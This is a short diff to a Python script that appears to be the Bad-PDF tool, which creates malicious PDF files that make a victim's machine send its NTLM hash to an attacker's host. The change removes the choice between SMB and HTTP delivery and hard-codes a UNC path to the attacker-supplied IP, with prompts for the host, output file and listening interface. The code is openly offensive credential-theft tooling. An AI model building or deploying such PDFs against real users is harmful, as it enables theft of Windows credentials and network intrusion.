@@ -124,17 +124,7 @@ if __name__ == "__main__":
         host = raw_input("Please enter Bad-PDF host IP: \n")
         filename = raw_input("Please enter output file name: \n")
         interface = raw_input("Please enter the interface name to listen(Default eth0): \n")
-        method = raw_input("How you want to send NTLM hash to Bad-PDF?\n[1] Over SMB\n\n[2] Over HTTP\n\n Option > ")
-
-        if method == '1':
-            create_malpdf(filename, '\\\\' + '\\\\' + host + '\\\\')
-
-        elif method == '2':
-            create_malpdf(filename, 'http://' + host + '/')
-
-        else:
-            print ("Please choose a valid option")
-            exit(0)
+        create_malpdf(filename, '\\\\' + '\\\\' + host + '\\\\')
 
         print("Bad PDF %s created" %filename)
 
